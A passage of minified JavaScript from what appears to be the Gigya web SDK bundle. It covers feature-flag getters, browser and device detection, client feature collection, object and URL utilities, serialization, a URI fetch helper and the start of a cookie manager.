      }), Object.defineProperty(e, "wcagContrastFix", {
        get: function () {
          return this.get("wcagContrastFix");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "newFormLinkInstanceElement", {
        get: function () {
          return this.get("newFormLinkInstanceElement");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "stopSendingReports", {
        get: function () {
          return this.get("stopSendingReports");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "setGroupApiDomainAfterLogin", {
        get: function () {
          return this.get("setGroupApiDomainAfterLogin");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useHttpStatusCode", {
        get: function () {
          return this.get("useHttpStatusCode");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "alwaysCheckCookieSave", {
        get: function () {
          return this.get("alwaysCheckCookieSave");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "fixPhoneTFATranslations", {
        get: function () {
          return this.get("fixPhoneTFATranslations");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "loadSsoFrameOnlyOnce", {
        get: function () {
          return this.get("loadSsoFrameOnlyOnce");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "verifyLoginOnlyOnce", {
        get: function () {
          return this.get("verifyLoginOnlyOnce");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "sendLangForEmailOTP", {
        get: function () {
          return this.get("sendLangForEmailOTP");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "setProviderFromResponse", {
        get: function () {
          return this.get("setProviderFromResponse");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "setCookieSameSiteLaxSession", {
        get: function () {
          return this.get("setCookieSameSiteLaxSession");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "setCookieSameSiteLaxSocial", {
        get: function () {
          return this.get("setCookieSameSiteLaxSocial");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "setCookieSameSiteLaxLowPriority", {
        get: function () {
          return this.get("setCookieSameSiteLaxLowPriority");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "forceErrorReport", {
        get: function () {
          return this.get("forceErrorReport");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "skipSameScreenCheckOnSwitch", {
        get: function () {
          return this.get("skipSameScreenCheckOnSwitch");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "getOnlyVisibleField", {
        get: function () {
          return this.get("getOnlyVisibleField");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "updateAccountInfoAsync", {
        get: function () {
          return this.get("updateAccountInfoAsync");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "magicLinkDispatchLoginWhenAdded", {
        get: function () {
          return this.get("magicLinkDispatchLoginWhenAdded");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "sanitizeEvaluatedValue", {
        get: function () {
          return this.get("sanitizeEvaluatedValue");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useSessionVerify", {
        get: function () {
          return this.get("useSessionVerify");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useExtendedPhoneNumberRegex", {
        get: function () {
          return this.get("useExtendedPhoneNumberRegex");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "generateNewCodeWcagCompliance", {
        get: function () {
          return this.get("generateNewCodeWcagCompliance");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "enforceAuthFlowRedirectForSocial", {
        get: function () {
          return this.get("enforceAuthFlowRedirectForSocial");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useDecodeURIComponent", {
        get: function () {
          return this.get("useDecodeURIComponent");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useOidcGetParamHashOldStyle", {
        get: function () {
          return this.get("useOidcGetParamHashOldStyle");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useViewportPollerAction", {
        get: function () {
          return this.get("useViewportPollerAction");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "ignoreInterruptionsInOidcPassiveLogin", {
        get: function () {
          return this.get("ignoreInterruptionsInOidcPassiveLogin");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "overrideAllChildContext", {
        get: function () {
          return this.get("overrideAllChildContext");
        },
        enumerable: !0,
        configurable: !0
      }), e.get = function (e) {
        var t, n;
        return (null === (t = window.gigya._.config) || void 0 === t ? void 0 : t.flags) && (null === (n = window.gigya._.config) || void 0 === n ? void 0 : n.flags[e]) || !1;
      }, Object.defineProperty(e, "apiFlags", {
        get: function () {
          return [];
        },
        enumerable: !0,
        configurable: !0
      }), e;
    }();
    t.FlagService = n;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = navigator.userAgent.toLowerCase();
    t.localInfo = {
      baseDomain: "",
      isBrowserSupportsFilesAPI: "function" == typeof FileReader || "object" == typeof FileReader,
      initTime: new Date(),
      version: 0,
      pageDomain: document.location.hostname,
      protocol: "http:" == document.location.protocol ? "http" : "https",
      userAgent: o,
      isWin: -1 != o.indexOf("win"),
      isIE: -1 != o.indexOf("msie") || -1 != o.indexOf("mozilla") && -1 != o.indexOf("trident"),
      isIE6: -1 != o.indexOf("msie 6."),
      isIE7: -1 != o.indexOf("msie 7."),
      isIE8: -1 != o.indexOf("msie 8."),
      isIE9: -1 != o.indexOf("msie 9."),
      isIE10: -1 != o.indexOf("msie 10."),
      isIE11: -1 != o.indexOf("mozilla") && -1 != o.indexOf("trident/7.0"),
      isEdgeLegacy: -1 != o.indexOf("edge"),
      isEdge: RegExp(/edg(?!e)/).test(o),
      isIOS: -1 != o.indexOf("iphone") || -1 != o.indexOf("ipad") || -1 != o.indexOf("ipod"),
      isSafari534: -1 != o.indexOf("safari/534"),
      isWeChat: -1 != o.indexOf("micromessenger"),
      iosVersion: -1 != o.indexOf("applewebkit") && -1 != o.indexOf("version/") ? parseInt(o.split("version/")[1].split(" ")[0]) : 0,
      isAndroid: -1 != o.indexOf("android"),
      isAndroidBrowser: function (e) {
        if (-1 === e.indexOf("mozilla/5.0")) return !1;
        if (-1 === e.indexOf("android 4")) return !1;
        if (-1 === e.indexOf("applewebkit")) return !1;
        if (-1 !== e.indexOf("windows phone")) return !1;
        var t = /chrome\/(\d+)/.exec(e);
        return !t || parseInt(t[1]) < 20;
      }(o),
      currentBrowser: "",
      androidVersion: -1 != o.indexOf("android") ? parseFloat(o.slice(o.indexOf("android") + 8)) : 0,
      isChrome: -1 != o.indexOf("chrome") && -1 == o.indexOf("edg"),
      isGoogleBot: -1 != o.indexOf("googlebot"),
      isFF: -1 != o.indexOf("firefox"),
      isOpera: -1 != o.indexOf("opera"),
      isSafari: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("safari") && -1 == navigator.appVersion.toLowerCase().indexOf("chrome") && -1 == o.indexOf("android"),
      isIOSWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(navigator.userAgent),
      isIOSChrome: -1 != o.indexOf("crios"),
      isMAC: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("mac"),
      isWindowsPhone: -1 != o.indexOf("windows phone"),
      isFacebookBrowser: -1 != o.indexOf("fban") || -1 != o.indexOf("fbav"),
      supportsPostMessage: null != window.postMessage && (-1 == o.indexOf("msie") || -1 != o.indexOf("iemobile")),
      supportsLocalStorage: !1,
      supportsSessionStorage: !1,
      supportsFlash: function () {
        var e = !1;
        try {
          if (navigator.mimeTypes && null != navigator.mimeTypes["application/x-shockwave-flash"] && navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) e = !0;else new ActiveXObject("ShockwaveFlash.ShockwaveFlash") && (e = !0);
        } catch (e) {}
        return e;
      }(),
      quirksMode: "BackCompat" == document.compatMode && -1 != o.indexOf("msie"),
      backCompat: "BackCompat" == document.compatMode,
      isMobile: function () {
        var e = ["iphone", "ipod", "android", "midp", "240x320", "blackberry", "netfront", "nokia", "panasonic", "portalmmm", "sharp", "sie-", "sonyericsson", "symbian", "windows ce", "benq", "mda", "mot-", "opera mini", "philips", "pocket pc", "sagem", "samsung", "htc"];
        for (var t in e) if (-1 != o.indexOf(e[t])) return !0;
        return !1;
      }(),
      isMobileApp: function () {
        if (!document.getElementsByTagName) return !1;
        for (var e = document.getElementsByTagName("meta"), t = 0; t < e.length; t++) if ("viewport" == e[t].getAttribute("name")) {
          var n = e[t].getAttribute("content");
          if (n && -1 !== n.indexOf("width=device-width")) return !0;
        }
        return !1;
      }(),
      isNativeMobileApp: !1,
      isTouch: function () {
        if ("ontouchstart" in window) return !0;
        if ("onmsgesturechange" in window) try {
          return new ActiveXObject("htmlfile"), !1;
        } catch (e) {
          return !0;
        }
        return !1;
      }(),
      isOnLine: function () {
        return navigator.onLine;
      },
      messagingMethod: 1
    };
    var r = function (e) {
      try {
        var t = window[e];
        if (!t) return !1;
        var n = "_gig_localStorage_test",
          i = "just checking for localStorage";
        t.setItem(n, i);
        var o = t.getItem(n) === i;
        return t.removeItem(n), o;
      } catch (e) {
        return !1;
      }
    };
    t.localInfo.supportsLocalStorage = r("localStorage"), t.localInfo.supportsSessionStorage = r("sessionStorage"), t.localInfo.isMAC = t.localInfo.isMAC && !t.localInfo.isIOS;
    var a = t.localInfo.isWin ? "windows" : t.localInfo.isWindowsPhone ? "winphone" : t.localInfo.isIOS ? "ios-v" + t.localInfo.iosVersion : t.localInfo.isMAC ? "mac" : t.localInfo.isAndroid ? "android" : "";
    a && (a += " ");
    var s = t.localInfo.isChrome ? "chrome" : t.localInfo.isFF ? "firefox" : t.localInfo.isSafari ? "safari" : t.localInfo.isEdge ? "edge" : t.localInfo.isEdgeLegacy ? "edge legacy" : t.localInfo.isIE11 ? "ie11" : t.localInfo.isIE10 ? "ie10" : t.localInfo.isIE9 ? "ie9" : t.localInfo.isIE8 ? "ie8" : "";
    t.localInfo.currentBrowser = a + s;
    var c = function () {
      function e(e, t) {
        void 0 === e && (e = window.gigya._.WindowProvider.navigator()), void 0 === t && (t = window.gigya._.WindowProvider.screen()), this.navigator = e, this.screen = t, this.collectData();
      }
      return e.prototype.collectData = function () {
        var e, t, n, o, r, a, s;
        return i.__awaiter(this, void 0, void 0, function () {
          var c, u, l, d, g, f, p, h;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return this.userAgent = null === (e = this.navigator) || void 0 === e ? void 0 : e.userAgent, this.plugins = Array.from((null === (t = this.navigator) || void 0 === t ? void 0 : t.plugins) || []).map(function (e) {
                  return {
                    name: e.name,
                    filename: e.filename,
                    length: e.length
                  };
                }), this.localTime = new Date().toLocaleTimeString(), this.timezoneOffset = new Date().getTimezoneOffset(), [4, null === (o = null === (n = this.navigator) || void 0 === n ? void 0 : n.permissions) || void 0 === o ? void 0 : o.query({
                  name: "notifications"
                })];
              case 1:
                return (c = i.sent()) && (u = c.state, this.permissionStatus = {
                  state: u
                }), this.webdriver = null === (r = this.navigator) || void 0 === r ? void 0 : r.webdriver, (d = this.navigator.getBattery) ? [4, this.navigator.getBattery()] : [3, 3];
              case 2:
                d = i.sent(), i.label = 3;
              case 3:
                return (l = d) && (g = l.charging, f = l.chargingTime, p = l.dischargingTime, h = l.level, this.batteryInfo = {
                  charging: g,
                  chargingTime: f,
                  dischargingTime: p,
                  level: h
                }), this.features = [(null === (a = this.navigator) || void 0 === a ? void 0 : a.maxTouchPoints) || (null === (s = this.navigator) || void 0 === s ? void 0 : s.msMaxTouchPoints), this.screen.width + "|" + this.screen.height + "|" + this.screen.colorDepth, this.navigator.javaEnabled(), "sendBeacon" in this.navigator], [2];
            }
          });
        });
      }, e;
    }();
    t.ClientFeature = c;
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(5),
        o = n(30);
      function r(e, t, n) {
        if (!t) return e;
        for (var i = e, o = t.split("."), r = 0; r < o.length; r++) {
          var a = o[r],
            s = null;
          a.match(/\[[0-9]+]/) && (s = Number(a.match(/\[[0-9]+]/)[0].replace(/[\[\]]/g, ""))), a = a.split(/\[[0-9]+]/).join("");
          var c = (s || 0 === s) && i[a] ? i[a][s] : i[a];
          if (n && !i[a] ? i[a] = {} : n && !c && !1 !== c && (i[a] = []), !c && !1 !== c) return null;
          i = c;
        }
        return i;
      }
      function a(e, t, n, i, r, s) {
        if (void 0 === i && (i = 20), void 0 === r && (r = 0), e === window) return window;
        if (r > i) return null;
        if (void 0 === e || null == e) return o.default.isOn("removeUndefinedProperties") ? e : null;
        if ("function" == typeof e && n) return null;
        if (e.constructor == Array) {
          for (var c = [], u = 0; u < e.length; u++) n && "function" == typeof e[u] || (c[u] = t ? a(e[u], t, n, i, r + 1, s) : e[u]);
          return c;
        }
        if ("object" == typeof e) {
          var l = {};
          for (var d in e) s && "context" == d || n && "function" == typeof e[d] || (l[d] = t ? a(e[d], t, n, i, r + 1, s) : e[d]);
          return l;
        }
        return e;
      }
      function s(e, t, n) {
        if (null != e) {
          if (null == t && (t = {}), e.constructor == Array) for (var i = 0; i < e.length; i++) s(e[i], t, n);else if (n) {
            var o = n.split("|"),
              r = {};
            for (var c in e) r[c.toLowerCase()] = 1;
            for (var u = 0; u < o.length; u++) {
              var l = o[u];
              r[l.toLowerCase()] && (t[l] = e[l]);
            }
          } else t = a(e, !1);
          return t;
        }
      }
      t.removeUndefined = function (e) {
        var t = {};
        for (var n in e) null != e[n] && null != e[n] && (t[n] = e[n]);
        return t;
      }, t.expressionHelper = function (e) {
        return e = e || {}, {
          getField: function (t) {
            if (t) {
              var n,
                i = t.split("."),
                o = e;
              for (n = 0; n < i.length; ++n) {
                if (null == o[i[n]]) return;
                o = o[i[n]];
              }
              return o;
            }
          }
        };
      }, t.getPropertyBySerializedName = r, t.setPropertyBySerializedName = function (e, t, n) {
        var i = t.split("."),
          o = i.pop();
        r(e, i.join("."), !0)[o] = n;
      }, t.add = function (e, t, n) {
        for (var i in t) n && void 0 !== e[i] || (e[i] = t[i]);
      }, t.getHash = function (e) {
        var t = [];
        for (var n in e) {
          var o;
          "object" == typeof e[n] ? o = i.serialize(e[n], !1) : e[n] && (o = e[n].toString()), t.push(n + "=" + o);
        }
        return t.sort().join("&");
      }, t.getMurmurHash = function (e, t) {
        var n, i, o, r, a, s, c, u;
        for (t || (t = 0), n = 3 & e.length, i = e.length - n, o = t, a = 3432918353, s = 461845907, u = 0; u < i;) c = 255 & e.charCodeAt(u) | (255 & e.charCodeAt(++u)) << 8 | (255 & e.charCodeAt(++u)) << 16 | (255 & e.charCodeAt(++u)) << 24, ++u, o = 27492 + (65535 & (r = 5 * (65535 & (o = (o ^= c = (65535 & (c = (c = (65535 & c) * a + (((c >>> 16) * a & 65535) << 16) & 4294967295) << 15 | c >>> 17)) * s + (((c >>> 16) * s & 65535) << 16) & 4294967295) << 13 | o >>> 19)) + ((5 * (o >>> 16) & 65535) << 16) & 4294967295)) + ((58964 + (r >>> 16) & 65535) << 16);
        switch (c = 0, n) {
          case 3:
            c ^= (255 & e.charCodeAt(u + 2)) << 16;
          case 2:
            c ^= (255 & e.charCodeAt(u + 1)) << 8;
          case 1:
            o ^= c = (65535 & (c = (c = (65535 & (c ^= 255 & e.charCodeAt(u))) * a + (((c >>> 16) * a & 65535) << 16) & 4294967295) << 15 | c >>> 17)) * s + (((c >>> 16) * s & 65535) << 16) & 4294967295;
        }
        return o ^= e.length, o = 2246822507 * (65535 & (o ^= o >>> 16)) + ((2246822507 * (o >>> 16) & 65535) << 16) & 4294967295, o = 3266489909 * (65535 & (o ^= o >>> 13)) + ((3266489909 * (o >>> 16) & 65535) << 16) & 4294967295, (o ^= o >>> 16) >>> 0;
      }, t.clone = a, t.merge = function e(t, n) {
        for (var i = {}, o = 0; o < t.length; o++) if (t[o] && t[o].length) for (var r = 0; r < t[o].length; r++) for (var a in t[o][r]) i[a] = t[o][r][a];else if (n) for (var a in t[o]) "object" != typeof i[a] || i[a] instanceof Array ? i[a] = t[o][a] : i[a] = e([i[a], t[o][a]], !0);else for (var a in t[o]) i[a] = t[o][a];
        return i;
      }, t.unflatten = function (e) {
        if (Object(e) !== e || Array.isArray(e)) return e;
        var t = {};
        for (var n in e) {
          for (var i = t, o = "", r = n.replace(/\[([0-9])]/, ".$1").split("."), a = 0; a < r.length; a++) {
            var s = !isNaN(Number(r[a]));
            i = i[o] || (i[o] = s ? [] : {}), o = r[a];
          }
          i[o] = e[n];
        }
        return t[""] || {};
      }, t.flatten = function (e, t) {
        void 0 === t && (t = !1);
        var n = {};
        return function e(i, o) {
          if (Object(i) !== i) n[o] = i;else if (Array.isArray(i)) {
            for (var r = i.length, a = 0; a < r; a++) {
              var s = t ? o + "[" + a + "]" : o + "." + a;
              e(i[a], o ? s : String(a));
            }
            0 === r && (n[o] = []);
          } else {
            var c = !0;
            for (var u in i) c = !1, e(i[u], o ? o + "." + u : u);
            c && "" !== o && (n[o] = {});
          }
        }(e, ""), n;
      }, t.extractProperties = s, t.extractProperty = function (e, t) {
        return s(e, void 0, t)[t];
      }, t.parseToObject = function (e) {
        try {
          var t = window.JSON.parse(e);
          if ("object" == typeof t) return t;
        } catch (e) {}
      }, t.removePropertiesPrefix = function (t, n) {
        return void 0 === t && (t = {}), void 0 === n && (n = ""), Object.keys(t).reduce(function (i, o) {
          var r;
          return e(i, ((r = {})[o.replace(n, "")] = t[o], r));
        }, {});
      }, t.addPrefixToProperties = function (e, t) {
        return void 0 === e && (e = {}), void 0 === t && (t = ""), Object.keys(e).reduce(function (n, i) {
          return 0 !== i.indexOf(t) ? n["" + t + i] = e[i] : n[i] = e[i], n;
        }, {});
      }, t.normalizeObjectKeysToLowerCase = function (e) {
        for (var t in e) e[t.toLowerCase()] = e[t];
        return e;
      }, t.decodeObjectKeys = function (e) {
        var t = {};
        for (var n in e) {
          for (var i = n; -1 !== i.indexOf("%");) i = decodeURIComponent(i);
          t[i] = e[n];
        }
        return t;
      };
    }).call(this, n(0).__assign);
  }, function (module, exports) {
    function serialize(e, t, n, i, o) {
      if (void 0 === t && (t = !1), void 0 === n && (n = !1), void 0 === i && (i = 0), void 0 === o && (o = 20), window.gigya.localInfo.isIE8) {
        if (i || (i = 0), i > o) return "[Too deep]";
        var r = "",
          a = "",
          s = "";
        if (n) {
          s = "\t", a = "\n";
          for (var c = 0; c < i + 1; c++) r += s;
        }
        var u = typeof e;
        if ("function" == u) return u.toString();
        if ("object" != u || null === e) return "string" == u && (e = '"' + e.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"'), String(e);
        var l,
          d,
          g = [],
          f = e && e.constructor == Array;
        if (f) for (c = 0; c < e.length; c++) u = typeof (d = e[c]), null == d || "undefined" == u ? d = "" : "string" == u ? d = '"' + d.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == u ? d = t ? "Function" : "" : d.parentNode && d.innerHTML ? d = "HTMLElement" : d.constructor == Date ? d = "" : "object" == u && null !== d && (d = serialize(d, t, n, i + 1)), "" != String(d) && g.push(r + s + String(d));else for (l in e) u = typeof (d = e[l]), null == d || "undefined" == u ? d = String(d) : "string" == u ? d = '"' + d.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == u ? d = t ? "Function" : "" : d.parentNode && d.innerHTML ? d = "HTMLElement" : d.constructor == Date ? d = "" : "object" == u && null !== d && (d = a + serialize(d, t, n, i + 1)), "" != String(d) && g.push(r + s + '"' + l.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '":' + String(d));
        return a + r + (f ? "[" : "{") + a + g.join("," + a) + a + r + (f ? "]" : "}");
      }
      return window.JSON.stringify(e);
    }
    function deserialize(json, defaultValue, scope) {
      if (!json || !json.replace(/^\s+|\s+$/g, "")) return defaultValue || {};
      try {
        var keys = [],
          values = [];
        if (scope) for (var key in scope) keys.push(key), values.push(scope[key]);
        var fn = eval("(function(" + keys.join(",") + ") { return " + json.trim() + "; })");
        return fn.apply(void 0, values);
      } catch (e) {
        return console.warn("Error deserializing JavaScript", e), defaultValue || {};
      }
    }
    function parse(e, t) {
      if (window.gigya.localInfo.isIE8) return deserialize(e, t);
      try {
        return window.JSON.parse(e);
      } catch (e) {
        return t || {};
      }
    }
    Object.defineProperty(exports, "__esModule", {
      value: !0
    }), exports.serialize = serialize, exports.deserialize = deserialize, exports.parse = parse;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(19),
      r = function () {
        function e(e, t) {
          void 0 === t && (t = !0), this._anchor = document.createElement("a");
          var n = "http:" == document.location.protocol ? "http" : "https";
          t && -1 === e.indexOf("://") && "/" !== e.charAt(0) && (e = n + "://" + e), this._anchor.href = e;
        }
        return Object.defineProperty(e.prototype, "domain", {
          get: function () {
            return this._anchor.hostname;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "path", {
          get: function () {
            return this._anchor.pathname;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "href", {
          get: function () {
            return this._anchor.href;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "search", {
          get: function () {
            return this._anchor.search.slice(1);
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "hash", {
          get: function () {
            return this._anchor.hash.slice(1);
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.toString = function () {
          return this._anchor.href;
        }, e.prototype.addToSearch = function (e) {
          for (var t in e) {
            var n = e[t];
            if (("boolean" == typeof n || "number" == typeof n || "string" == typeof n) && "eventName" != t) {
              var i = this._anchor.search ? "&" : "";
              this._anchor.search += "" + i + t + "=" + encodeURIComponent(e[t]);
            }
          }
          return this;
        }, e.prototype.fetch = function (e) {
          return void 0 === e && (e = 0), i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return i.trys.push([0, 5,, 8]), window.fetch ? [4, this.browserFetch()] : [3, 2];
                case 1:
                  return t = i.sent(), [3, 4];
                case 2:
                  return [4, this.xhr()];
                case 3:
                  t = i.sent(), i.label = 4;
                case 4:
                  return [2, t];
                case 5:
                  if (n = i.sent(), e <= 0) throw new Error("fetch failed: " + n);
                  return [4, this.delay(1)];
                case 6:
                  return i.sent(), [4, this.fetch(e - 1)];
                case 7:
                  return [2, i.sent()];
                case 8:
                  return [2];
              }
            });
          });
        }, e.prototype.isBaseOf = function (t) {
          return e.parse(t).isIn(this);
        }, e.prototype.isIn = function (t) {
          return "string" == typeof t && (t = e.parse(t)), (this.domain == t.domain || this.isSubDomainOf(t)) && (!t.path || 0 == this.path.indexOf(t.path));
        }, e.prototype.isForSubDomains = function () {
          return 0 == this.domain.indexOf(".");
        }, e.prototype.isSubDomainOf = function (e) {
          var t = "";
          return e.isForSubDomains() || (t = "."), t += e.domain, o.endsWith(this.domain, t);
        }, e.parse = function (t, n) {
          if (void 0 === n && (n = !0), t) return new e(t, n);
        }, e.prototype.browserFetch = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t;
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return e = this.toString(), [4, window.fetch(e)];
                case 1:
                  if (!(t = n.sent()).ok) throw new Error("fetch failed");
                  return [2, t.json()];
              }
            });
          });
        }, e.prototype.xhr = function () {
          var e = this.toString();
          return new gigya.Promise(function (t, n) {
            var i = new XMLHttpRequest();
            i.open("GET", e), i.send(), i.onerror = n, i.onload = function () {
              if (4 !== i.readyState || 200 !== i.status) return n("xhr failed - " + i.status + " - " + i.statusText);
              try {
                var e = JSON.parse(i.responseText);
                return t(e);
              } catch (e) {
                return n(e);
              }
            };
          });
        }, e.prototype.delay = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              return [2, new gigya.Promise(function (t) {
                return setTimeout(t, e);
              })];
            });
          });
        }, e;
      }();
    t.Uri = r;
  },,, function (module, exports, __webpack_require__) {
    Object.defineProperty(exports, "__esModule", {
      value: !0
    });
    var tslib_1 = __webpack_require__(0),
      DOMUtils = __webpack_require__(13),
      cdn_1 = __webpack_require__(21),
      LocalInfo_1 = __webpack_require__(3);
    function callAsync(e, t) {
      return void 0 === t && (t = {}), tslib_1.__awaiter(this, void 0, void 0, function () {
        return tslib_1.__generator(this, function (n) {
          return [2, new gigya.Promise(function (n) {
            callFunction("gigya." + e, [tslib_1.__assign(tslib_1.__assign({}, t), {
              callback: n
            })]);
          })];
        });
      });
    }
    function callFunction(name, arParams) {
      var fn = eval(name),
        arParts = name.split(".");
      arParts.splice(arParts.length - 1, 1);
      var scope = eval(arParts.join("."));
      fn.apply(scope, arParams);
    }
    function invokeOnPageLoad(e, t) {
      if (!document.readyState && document.body || "complete" === document.readyState || !t && "interactive" === document.readyState && document.body) e();else {
        var n = !1,
          i = function () {
            n || (n = !0, e());
          };
        window.setTimeout(i, 2e4), DOMUtils.addEventListener(window, "load", i), DOMUtils.addEventListener(document, "DOMContentLoaded", i);
      }
    }
    function createAlias(e, t) {
      for (var n = e.split("."), i = window, o = 0; o < n.length - 1; o++) {
        var r = n[o];
        i[r] || (i[r] = {}), i = i[r];
      }
      i[n[n.length - 1]] = t;
    }
    function debounce(e, t) {
      var n = void 0;
      return function () {
        void 0 !== n && clearTimeout(n), n = setTimeout(function () {
          n = void 0, e();
        }, t);
      };
    }
    function addSrcToIFrameIfNeeded(e, t) {
      void 0 === t && (t = cdn_1.getCdnResource("/")), (LocalInfo_1.localInfo.isIOSWebView || LocalInfo_1.localInfo.isIOS && LocalInfo_1.localInfo.isWeChat) && e.setAttribute("src", t);
    }
    exports.callAsync = callAsync, exports.callFunction = callFunction, exports.invokeOnPageLoad = invokeOnPageLoad, exports.createAlias = createAlias, exports.debounce = debounce, exports.addSrcToIFrameIfNeeded = addSrcToIFrameIfNeeded;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(11),
      o = n(16),
      r = n(4);
    function a(e) {
      return decodeURIComponent(e.replace(/\+/g, " "));
    }
    function s(e, t) {
      return e && -1 !== e.indexOf("?") ? o.deserialize(e.split("#")[0].split("?")[1], "&", t) : {};
    }
    t.URLEncode = function (e) {
      return encodeURIComponent(e);
    }, t.URLDecode = a, t.URLDecodeRecursive = function (e) {
      for (var t = "", n = e; n != t;) n = a(t = n);
      return n;
    }, t.getParamsFromURL = s, t.getGigParamsFromURL = function (e) {
      var t = e || {},
        n = t.url,
        o = t.paramPrefix,
        r = t.keysToLower,
        a = t.removePrefix,
        c = o || i.GIGYA_PARAM_PREFIX,
        u = s(n, r);
      return Object.keys(u).filter(function (e) {
        return 0 === e.indexOf(c) && e !== c;
      }).reduce(function (e, t) {
        return e[a ? t.slice(4) : t] = u[t], e;
      }, {});
    }, t.getParamValueFromURL = function (e, t, n) {
      if (null == t || "" == t) return n;
      var i = t.indexOf("?");
      if (-1 === i) return n;
      var o = "&" + t.substr(i + 1),
        r = o.toLowerCase().indexOf("&" + e.toLowerCase() + "=");
      if (-1 === r) return n;
      var a = o.substr(r + (1 + e.length + 1)) + "&";
      return r = a.indexOf("&"), a.substr(0, r);
    }, t.addParamsToURL = function (e, t) {
      var n = s(e);
      r.add(n, t);
      var i = e.split("#"),
        a = i[0].split("?")[0] + "?" + o.serialize(n, "&");
      return i.length > 1 && (a += "#" + i[1]), a;
    };
    t.getContextParamsFromUrl = function (e) {
      var t = e || {},
        n = t.url,
        i = t.paramPrefix,
        o = t.unacceptableParams;
      return n ? function (e, t) {
        if (!t) return e;
        var n = {};
        return Object.entries(e || {}).filter(function (e) {
          var n = e[0];
          return !t.test(n);
        }).forEach(function (e) {
          var t = e[0],
            i = e[1];
          return n[t] = i;
        }), n;
      }(window.gigya.utils.URL.getGigParamsFromURL({
        url: n,
        paramPrefix: i
      }), o) : {};
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), function (e) {
      e[e.gigyaPhone = 0] = "gigyaPhone", e[e.gigyaTotp = 1] = "gigyaTotp", e[e.gigyaPush = 2] = "gigyaPush", e[e.livelink = 3] = "livelink";
    }(t.EditableTfaProvidersTypes || (t.EditableTfaProvidersTypes = {})), t.gigyaAssertionExpiration = 3e5, t.sensitiveParamsOverride = "login_token", t.GIGYA_PARAM_PREFIX = "gig_", t.GIGYA_INTERNAL_PARAM_PREFIX = t.GIGYA_PARAM_PREFIX + "i_", t.GIGYA_INTERNAL_PARAMS = t.GIGYA_PARAM_PREFIX + "actions";
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(3),
      r = n(28),
      a = function () {
        function e(e) {
          void 0 === e && (e = new r.CookieStore()), this._cookieStore = e;
        }
        return e.prototype.set = function (e, t, n, i, r, a) {
          null == i && (i = this.getDefaultDomain());
          var s = r ? "" : "/",
            c = this._getExpirationInMs(n),
            u = null;
          null != c && (u = new Date()).setTime(u.getTime() + c);
          var l = this._setCookieInternal(e, t, s, u, i, a),
            d = !c || c > 0;
          if (d === l) return !0;
          var g = o.localInfo.pageDomain;
          return (l = this._setCookieInternal(e, t, s, u, g, a)) === d;
        }, e.prototype.get = function (e) {
          return this._cookieStore.getCookie(e);
        }, e.prototype.remove = function (e, t) {
